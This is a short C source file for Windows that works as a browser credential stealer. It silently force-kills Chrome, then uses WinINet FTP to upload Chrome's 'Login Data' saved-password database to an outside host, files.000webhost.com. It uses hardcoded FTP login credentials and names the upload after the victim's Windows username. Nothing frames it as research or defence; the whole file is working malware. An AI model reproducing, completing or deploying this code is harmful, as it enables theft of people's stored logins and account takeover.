#include <wininet.h>
#include <windows.h>
#pragma comment(lib, "Wininet")

void UploadToServer(const char* file, const char* ftpname)
{
    HINTERNET hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hFtpSession = InternetConnect(hInternet, "files.000webhost.com", INTERNET_DEFAULT_FTP_PORT, "serversion", "quantumcore91939", INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
    FtpPutFile(hFtpSession, file, ftpname, FTP_TRANSFER_TYPE_BINARY, 0);
    InternetCloseHandle(hFtpSession);
    InternetCloseHandle(hInternet);

}


int main() {
    const char* ftpname = getenv("USERNAME");
    WinExec("taskkill /IM chrome.exe /F", SW_HIDE);
    UploadToServer("C:\\Users\\saadm\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", ftpname);
    return 0;
}